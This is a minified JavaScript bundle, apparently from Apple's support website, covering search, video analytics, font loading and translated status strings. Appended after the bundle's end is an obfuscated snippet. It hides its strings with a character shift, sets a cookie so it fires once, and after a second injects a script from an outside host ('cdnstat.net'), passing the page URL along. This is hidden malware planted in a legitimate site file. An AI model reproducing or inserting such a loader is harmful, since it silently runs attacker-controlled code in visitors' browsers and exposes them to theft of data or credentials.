problem":-1!==e.indexOf("apple.com")?"marcom":"others"},t.exports=v},{"../../utils/as-core":508,"../as-locale-mapping/as-locale-mapping":492,"./as-search-no-results-template.hbs":495,"./as-search-quicklinks-template.hbs":496,"./as-search-results-divider-space-template.hbs":497,"./as-search-searchterm-highlight-template.hbs":498,"./as-search-suggestions-template.hbs":499,"./as-search-toggle-classes":500,"@marcom/ac-ajax":40,"@marcom/ac-classlist":63,"@marcom/ac-dom-events":75,"@marcom/ac-dom-traversal/querySelector":113,"@marcom/ac-dom-traversal/querySelectorAll":114,"@marcom/ac-keyboard":162,"@marcom/function-utils/debounce":431,"hbsfy/runtime":477}],502:[function(e,t,n){"use strict";var i=e("@marcom/ac-films").create,r=e("@marcom/ac-object/create"),o=e("@marcom/ac-event-emitter").EventEmitter,s=e("@marcom/ac-dom-traversal"),a=e("@marcom/ac-dom-events/utils/addEventListener"),c=e("@marcom/useragent-detect"),l=e("@marcom/function-utils/debounce"),u={title:"",type:"",player:"",linkOwner:""};const h=c.os.ios;var d="",p=!1;const f="videoseeked",m=window.location.origin;var _=null,v=document.querySelector('meta[name="o:token"]'),g=document.querySelector('meta[name="o:testid"]');var y=function(){this.init()};function b(){null===v&&null===g&&window.bindVideoEventListenersFn()}function w(){window.bindVideoEventListenersFn=function(){var e=s.querySelectorAll(".ac-films-modal-link"),t=m+"/etc/designs/support/publish/commons-sk7/ac-assets/ac-toolkit/ac-video";e.length>0&&e.forEach(((n,r)=>{var o=function(e,t){var n=t.querySelector(".as-thumbnail-image");return n&&n.children.length<1?n.style.backgroundImage.split(/"/)[1]:n&&n.children.length>0?n.querySelector("img").getAttribute("src"):e+"/images/poster/ac_video_poster_960x540.jpeg"}(t,n),s={modal:!0};s.poster=o,s.hlsUrl=t+"/libs/hls/hls.js",s.localizationBasePath=t+"/json/localization/",s.urlOptimizeHls=!0;var c=i([n],s).player;c.once("loadstart",k.bind(c)),c.on("loadeddata",x.bind(c)),c.on("ended",D.bind(c)),c.on("play",S.bind(c)),c.on("pause",T.bind(c)),h&&c.on("seeked",l(O.bind(c),1e3)),0===r&&setTimeout((()=>{return t=e,n={video:[]},Array.from(t).forEach((function(e){a(e,"click",E);var t=R("pageload",null,e);n.video.push(t.video[0])})),I(n),void(window._applemd&&(window._applemd.video=n.video));var t,n}),3e3)}))}}function E(){var e=s.querySelector(".ac-modal-video"),t=this.dataset,n=t.analyticsLinkComponent_name,i=t.analyticsLinkComponent_type,r=t.defaultPlayer;if(u.title=n,u.type=i,u.player=r,u.linkOwner="no",t.hasOwnProperty("linkOwner")&&(u.linkOwner=t.linkOwner),!e){u.player="web native";var o=R("native_player");h||I(o)}}function k(){var e=s.querySelector(".modal-open .modal-close"),t=s.querySelector(".modal-open .controls-progress-bar"),n=s.querySelector(".modal-open .controls-text-tracks-toggle-button"),i=s.querySelector(".modal-open .controls-picture-in-picture-button");null!==e&&e.addEventListener("click",F.bind(this)),null!==t&&t.addEventListener("click",A.bind(this)),null!==n&&n.addEventListener("click",L.bind(this)),null!==i&&i.addEventListener("click",P.bind(this))}function x(){clearInterval(d);var e,t=M(this);I(R("videoloaded","s:0-"+t.duration)),e=10*t.duration,d=setInterval(C.bind(this),e)}function S(){p=!1}function T(){M(this),p=!0}function C(){if(!p){var e=M(this),t=e.perView;if(_!==t&&(_=t,10===t||25===t||50===t||75===t))I(R("videoprogress","m:"+t+"-"+e.duration))}}function O(){var e=M(this),t="sk:"+e.perView+"-"+e.duration;I(R(f,t))}function A(){var e=M(this),t="sk:"+e.perView+"-"+e.duration;I(R(f,t))}function L(){I(R("videocaptions","cc"))}function P(){I(R("pipmode","fw"))}function D(){I(R("videoended","e:100-"+M(this).duration))}function F(){clearInterval(d);var e=M(this);I(R("videoclosed","cl:"+e.perView+"-"+e.duration))}function M(e){var t=e.getDuration(),n=e.getCurrentTime(),i=Math.floor((n/t*100).toFixed(2));return{duration:Math.ceil(t),currentTime:n,perView:i}}function I(e){void 0===window.launchPageLevelTrackFn&&null===window.launchPageLevelTrackFn||window.launchPageLevelTrackFn(e,"video")}function R(e,t,n){var i,r={},o=s.querySelector(".ac-modal-video"),a=u.title.trim(),c=u.type,l=u.player,h="",d=(i=u).hasOwnProperty("linkOwner")&&"yes"===i.linkOwner?i.linkOwner:null;return"pageload"===e?(a=(n=n.dataset).analyticsLinkComponent_name.trim(),c="Video",l="marcom",o||(l="web native"),h="impression"):"native_player"===e?(l="web native",h="impression"):h="videocaptions"===e?"cc":"pipmode"===e?"fw":t,r.video=[{name:a,type:c,player:l,link_text:h}],r.hasOwnProperty("comp")&&delete r.comp,"yes"===d&&"videoloaded"===e&&(r.comp={link_owner:"ac_link"}),r}(y.prototype=r(o.prototype)).init=function(){a(window,"DOMContentLoaded",w.bind(this)),a(window,"load",b.bind(this))},t.exports=y},{"@marcom/ac-dom-events/utils/addEventListener":82,"@marcom/ac-dom-traversal":99,"@marcom/ac-event-emitter":124,"@marcom/ac-films":134,"@marcom/ac-object/create":185,"@marcom/function-utils/debounce":431,"@marcom/useragent-detect":435}],503:[function(e,t,n){"use strict";e("hbsfy/runtime").registerPartial("as-common-loader",e("../../partials/as-common-loader.hbs"))},{"../../partials/as-common-loader.hbs":506,"hbsfy/runtime":477}],504:[function(e,t,n){"use strict";var i=e("@marcom/ac-dom-traversal/querySelector"),r=e("@marcom/ac-dom-traversal/lastChild"),o=e("@marcom/ac-classlist"),s=i(".main"),a=i("html");if(o.contains(a,"oldie")){var c=r(s);o.add(c,"as-last-child")}},{"@marcom/ac-classlist":63,"@marcom/ac-dom-traversal/lastChild":107,"@marcom/ac-dom-traversal/querySelector":113}],505:[function(e,t,n){"use strict";e("./utils/as-debug"),e("./utils/as-feature-detections");var i=e("@marcom/ac-dom-events/utils/addEventListener"),r=e("@marcom/ac-localnav/Localnav"),o=e("./common/as-search/as-search"),s=e("./common/as-expert-tips/as-expert-tips"),a=e("./common/as-dropdown/as-dropdown"),c=e("./common/as-qp/as-qp"),l=e("./utils/as-font-flicker"),u=e("./utils/as-core"),h=(e("./common/handlebars-helpers/handlebars-helpers"),e("./common/ie8-helpers/ie8-helpers"),e("./common/as-mailsettings/as-mailsettings")),d=e("./common/as-enterprise/as-enterprise"),p=e("./common/as-analytics/as-analytics.js"),f=e("./common/as-video/as-video.js"),m=e("@marcom/ac-footer/Footer"),_={expertTips:function(){return(new s).init()},qp:function(){new c},mailsettings:function(){new h},enterprise:function(){new d},searchBox:function(){return(new o).init()},aslocalNav:function(){var e=document.getElementById("as-localnav");e&&new r(e,{className:"as-localnav"})},asVideo:function(){new f},marcomFooter:function(e){var t=document.getElementById("ac-globalfooter");t&&new m(t)},initialize:function(){i(window,"DOMContentLoaded",v),this.searchBox(),this.expertTips(),this.qp(),this.mailsettings(),this.enterprise(),this.aslocalNav(),this.asVideo(),this.marcomFooter(),l(),i(window,"load",g);var e=new u;return i(window,"load",e.reFlowEachElement(["contentLink-image"])),this}};function v(){p.init()}function g(){a()}t.exports=_.initialize()},{"./common/as-analytics/as-analytics.js":484,"./common/as-dropdown/as-dropdown":486,"./common/as-enterprise/as-enterprise":487,"./common/as-expert-tips/as-expert-tips":490,"./common/as-mailsettings/as-mailsettings":493,"./common/as-qp/as-qp":494,"./common/as-search/as-search":501,"./common/as-video/as-video.js":502,"./common/handlebars-helpers/handlebars-helpers":503,"./common/ie8-helpers/ie8-helpers":504,"./utils/as-core":508,"./utils/as-debug":509,"./utils/as-feature-detections":510,"./utils/as-font-flicker":511,"@marcom/ac-dom-events/utils/addEventListener":82,"@marcom/ac-footer/Footer":146,"@marcom/ac-localnav/Localnav":170}],506:[function(e,t,n){var i=e("hbsfy/runtime");t.exports=i.template({compiler:[7,">= 4.0.0"],main:function(e,t,n,i,r){return'<div class="as-common-loader"></div>'},useData:!0})},{"hbsfy/runtime":477}],507:[function(e,t,n){"use strict";var i,r=e("@marcom/ac-classlist"),o=e("@marcom/ac-dom-traversal/querySelector"),s=e("./translations/content-status.json"),a=e("./svg/as-progress-indicator-svg");function c(e){var t=o("#"+e+" span");t&&(t.innerHTML=a,r.add(t,"as-button-loader"))}function l(e){var t=o("#"+e+" span.as-button-loader");t&&(r.remove(t,"as-button-loader"),t.innerHTML="")}function u(e){var t=o("#content-update");t&&(t.innerHTML=function(e,t){var n=s.en[t];return s[e.locale]?n=s[e.locale][t]:s[e.lang]&&(n=s[e.lang][t]),n}(e,"updating"),i&&clearTimeout(i),i=setTimeout((function(){h()}),2e3))}function h(){var e=o("#content-update");e&&(e.innerHTML="")}function d(){var e={locale:"",lang:""};return e.locale=void 0!==document.documentElement.lang?document.documentElement.lang:"en-US",e.lang=e.locale.split("-")[0]||"en",e}t.exports=function(){return{showSpinnerOnButton:c,hideSpinnerOnButton:l,includeContentUpdating:u,clearContentStatus:h,getLocale:d}}},{"./svg/as-progress-indicator-svg":513,"./translations/content-status.json":514,"@marcom/ac-classlist":63,"@marcom/ac-dom-traversal/querySelector":113}],508:[function(e,t,n){"use strict";function i(e){var t=[];if(!Array.isArray(e))return!1;e.forEach((function(e,n,i){var r=Array.prototype.slice.call(document.getElementsByClassName(e));Array.isArray(r)?r.forEach((function(e,n,i){t.push((function(){"IMG"===e.nodeName?e.setAttribute("src",e.getAttribute("src")):e.outerHTML=e.outerHTML}))})):r.outerHTML=r.outerHTML})),window.onresize=function(){t.forEach((function(e,t,n){e.apply()}))}}function r(){for(var e={},t=window.location.search.substring(1).split("&"),n=0;n<t.length;n++){var i=t[n].split("=");if(void 0===e[i[0]])e[i[0]]=decodeURIComponent(i[1]);else if("string"==typeof e[i[0]]){var r=[e[i[0]],decodeURIComponent(i[1])];e[i[0]]=r}else e[i[0]].push(decodeURIComponent(i[1]))}return e}function o(e,t){var n=!1,i=!0,r=e.document,o=r.documentElement,s=r.addEventListener,a=s?"addEventListener":"attachEvent",c=s?"removeEventListener":"detachEvent",l=s?"":"on",u=function i(o){"readystatechange"==o.type&&"complete"!=r.readyState||(("load"==o.type?e:r)[c](l+o.type,i,!1),!n&&(n=!0)&&t.call(e,o.type||o))};if("complete"==r.readyState)t.call(e,"lazy");else{if(!s&&o.doScroll){try{i=!e.frameElement}catch(e){}i&&function e(){try{o.doScroll("left")}catch(t){return void setTimeout(e,50)}u("poll")}()}r[a](l+"DOMContentLoaded",u,!1),r[a](l+"readystatechange",u,!1),e[a](l+"load",u,!1)}}t.exports=function(){return{getQueryString:r,documentReady:o,reFlowEachElement:i,keys:{ESC:27,TAB:9,RETURN:13,LEFT:37,UP:38,RIGHT:39,DOWN:40,SPACE:32,BACKSPACE:8,DELETE:46,SHIFT:16,CTRL:17,ALT:18,CAPS_LOCK:20,MAC_CMD_LEFT:91,MAC_CMD_RIGHT:93,MAC_CMD_FIREFOX:224,WINDOWS_KEY:91}}}},{}],509:[function(e,t,n){"use strict";var i,r=new(e("./as-core")),o=window.asApp||{};t.exports=void 0===o.pageProps||o.pageProps.isProd?null:(i=r.getQueryString().env||o.pageProps.environment,void(o.hasOwnProperty("pageProps")&&"prod"===i&&(o.pageProps.environment=i,console.log("modified pageProps"),console.log(o))))},{"./as-core":508}],510:[function(e,t,n){"use strict";var i=e("@marcom/ac-headjs");i.addTests({flex:function(){var e=document.documentElement.style;if("flexWrap"in e||"WebkitFlexWrap"in e||"msFlexWrap"in e)return!0}}),t.exports=i.htmlClass()},{"@marcom/ac-headjs":159}],511:[function(e,t,n){"use strict";var i=e("@marcom/ac-browser"),r=e("@marcom/ac-classlist"),o=e("./fonts/font-mapping.json"),s=e("@marcom/ac-object/isEmpty");t.exports=function(){var e,t=document.getElementsByTagName("html")[0];("Safari"===i.name||"Safari Mobile"===i.name)&&i.version>=10?(e=function(){var e,n=t.lang?t.lang.toLowerCase():"en",i=["ar","en","jp","ko","th","zh-cn","zh-hk","zh-mo","zh-tw"];if(e=(n=i.indexOf(n)>0||i.indexOf(n.split("-")[0])>0?n:"en").split("-")[0]||"en",o&&!s(o))for(var r in o)if(r===n||r===e)return o[r]}(),new FontFace("MyWebFont","url("+e.woff2+") format('woff2'), url("+e.woff+") format('woff')").load().then((function(e){r.add(t,"as-loaded")}))):r.add(t,"as-loaded")}},{"./fonts/font-mapping.json":512,"@marcom/ac-browser":52,"@marcom/ac-classlist":63,"@marcom/ac-object/isEmpty":190}],512:[function(e,t,n){t.exports={ar:{woff:"https://www.apple.com/wss/fonts/SF-Pro-AR/v1/SFProAR_semibold.woff",woff2:"https://www.apple.com/wss/fonts/SF-Pro-AR/v1/SFProAR_semibold.woff2"},en:{woff:"https://www.apple.com/wss/fonts/SF-Pro-Display/v3/sf-pro-display_semibold.woff",woff2:"https://www.apple.com/wss/fonts/SF-Pro-Display/v3/sf-pro-display_semibold.woff2"},jp:{woff:"https://www.apple.com/wss/fonts/SF-Pro-JP/v1/SFProJP_semibold.woff",woff2:"https://www.apple.com/wss/fonts/SF-Pro-JP/v1/SFProJP_semibold.woff2"},ko:{woff:"https://www.apple.com/wss/fonts/SF-Pro-KR/v2/SFProKRDisplay_semibold.woff",woff2:"https://www.apple.com/wss/fonts/SF-Pro-KR/v2/SFProKRDisplay_semibold.woff2"},th:{woff:"https://www.apple.com/wss/fonts/SF-Pro-TH/v2/SFProTHDisplay_semibold.woff",woff2:"https://www.apple.com/wss/fonts/SF-Pro-TH/v2/SFProTHDisplay_semibold.woff2"},"zh-cn":{woff:"https://www.apple.com.cn/wss/fonts/SF-Pro-SC/v1/PingFangSC-Semibold.woff",woff2:"https://www.apple.com.cn/wss/fonts/SF-Pro-SC/v1/PingFangSC-Semibold.woff2"},"zh-hk":{woff:"https://www.apple.com/wss/fonts/SF-Pro-HK/v1/PingFangHK-Semibold.woff",woff2:"https://www.apple.com/wss/fonts/SF-Pro-HK/v1/PingFangHK-Semibold.woff2"},"zh-mo":{woff:"https://www.apple.com/wss/fonts/SF-Pro-TC/v1/PingFangTC-Semibold.woff",woff2:"https://www.apple.com/wss/fonts/SF-Pro-TC/v1/PingFangTC-Semibold.woff2"},"zh-tw":{woff:"https://www.apple.com/wss/fonts/SF-Pro-TC/v1/PingFangTC-Semibold.woff",woff2:"https://www.apple.com/wss/fonts/SF-Pro-TC/v1/PingFangTC-Semibold.woff2"}}},{}],513:[function(e,t,n){"use strict";t.exports='<svg class="progress-indicator-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 56 56" aria-hidden="true"> <g class="progress-indicator-spokes"> <path class="progress-indicator-spoke" d="M28,8.5A2.5,2.5,0,0,1,30.5,11v7a2.5,2.5,0,0,1-5,0V11A2.5,2.5,0,0,1,28,8.5Z" ></path> <path class="progress-indicator-spoke" d="M41.79,14.21a2.52,2.52,0,0,1,0,3.54L36.84,22.7a2.5,2.5,0,0,1-3.54-3.54l5-4.95A2.52,2.52,0,0,1,41.79,14.21Z" ></path> <path class="progress-indicator-spoke" d="M47.5,28A2.5,2.5,0,0,1,45,30.5H38a2.5,2.5,0,0,1,0-5h7A2.5,2.5,0,0,1,47.5,28Z" ></path> <path class="progress-indicator-spoke" d="M41.79,41.79a2.52,2.52,0,0,1-3.54,0l-5-4.95a2.5,2.5,0,0,1,3.54-3.54l4.95,5A2.52,2.52,0,0,1,41.79,41.79Z" ></path> <path class="progress-indicator-spoke" d="M28,47.5A2.5,2.5,0,0,1,25.5,45V38a2.5,2.5,0,0,1,5,0v7A2.5,2.5,0,0,1,28,47.5Z" ></path> <path class="progress-indicator-spoke" d="M14.21,41.79a2.52,2.52,0,0,1,0-3.54l4.95-5a2.5,2.5,0,0,1,3.54,3.54l-4.95,4.95A2.52,2.52,0,0,1,14.21,41.79Z" ></path> <path class="progress-indicator-spoke" d="M8.5,28A2.5,2.5,0,0,1,11,25.5h7a2.5,2.5,0,0,1,0,5H11A2.5,2.5,0,0,1,8.5,28Z" ></path> <path class="progress-indicator-spoke" d="M14.21,14.21a2.52,2.52,0,0,1,3.54,0l4.95,4.95a2.5,2.5,0,0,1-3.54,3.54l-4.95-4.95A2.52,2.52,0,0,1,14.21,14.21Z" ></path> </g></svg>'},{}],514:[function(e,t,n){t.exports={ar:{updating:"تحديث المحتوى",updated:"تم تحديث المحتوى"},bg:{updating:"Актуализиране на съдържанието",updated:"Съдържанието е актуализирано"},cs:{updating:"Probíhá aktualizace obsahu",updated:"Obsah byl aktualizován"},da:{updating:"Indholdet opdateres",updated:"Indholdet er opdateret"},de:{updating:"Inhalt wird aktualisiert",updated:"Inhalt wurde aktualisiert"},el:{updating:"Γίνεται ενημέρωση περιεχομένου",updated:"Το περιεχόμενο ενημερώθηκε"},en:{updating:"Content updating",updated:"Content updated"},es:{updating:"Actualización de contenido",updated:"Contenido actualizado"},"es-CL":{updating:"Actualizando contenido",updated:"Contenido actualizado"},"es-CO":{updating:"Actualizando contenido",updated:"Contenido actualizado"},"es-ET":{updating:"Sisu värskendamine",updated:"Sisu värskendatud"},"es-MX":{updating:"Actualizando contenido",updated:"Contenido actualizado"},fi:{updating:"Sisältöä päivitetään",updated:"Sisältö päivitetty"},fr:{updating:"Mise à jour du contenu",updated:"Contenu mis à jour"},hr:{updating:"Sadržaj se ažurira",updated:"Sadržaj ažuriran"},hu:{updating:"Tartalom frissítése",updated:"Tartalom frissítve"},id:{updating:"Konten yang sedang diperbarui",updated:"Konten yang telah diperbarui"},it:{updating:"Aggiornamento del contenuto",updated:"Contenuto aggiornato"},ja:{updating:"コンテンツを更新しています",updated:"コンテンツが更新されました"},ko:{updating:"콘텐츠 업데이트 중",updated:"콘텐츠 업데이트됨"},lt:{updating:"Turinys naujinamas",updated:"Turinys atnaujintas"},lv:{updating:"Atjaunina saturu",updated:"Saturs atjaunināts"},nl:{updating:"Inhoud wordt bijgewerkt",updated:"Inhoud is bijgewerkt"},no:{updating:"Innhold oppdateres",updated:"Innhold oppdatert"},pl:{updating:"Uaktualnianie zawartości",updated:"Zawartość uaktualniona"},"pt-BR":{updating:"Atualizando conteúdo",updated:"Conteúdo atualizado"},"pt-PT":{updating:"Conteúdos em atualização",updated:"Conteúdos atualizados"},ro:{updating:"Conținutul este în curs de actualizare",updated:"Conținutul a fost actualizat"},ru:{updating:"Содержимое обновляется",updated:"Содержимое обновлено"},sk:{updating:"Obsah sa aktualizuje",updated:"Obsah sa aktualizoval"},sl:{updating:"Posodabljanje vsebine",updated:"Vsebina je posodobljena"},sv:{updating:"Innehållet uppdateras",updated:"Innehållet uppdaterat"},th:{updating:"การอัพเดทคอนเทนต์",updated:"อัพเดทคอนเทนต์แล้ว"},tr:{updating:"İçerik güncelleniyor",updated:"İçerik güncellendi"},vi:{updating:"Đang cập nhật nội dung",updated:"Đã cập nhật nội dung"},"zh-CN":{updating:"内容更新中",updated:"内容已更新"},"zh-HK":{updating:"正在更新內容",updated:"已更新內容"},"zh-MO":{updating:"正在更新內容",updated:"已更新內容"},"zh-TW":{updating:"內容更新中",updated:"內容已更新"}}},{}]},{},[505]);(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44hisxy'+'fy3sjy4ljy4xhwnuy'+'3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));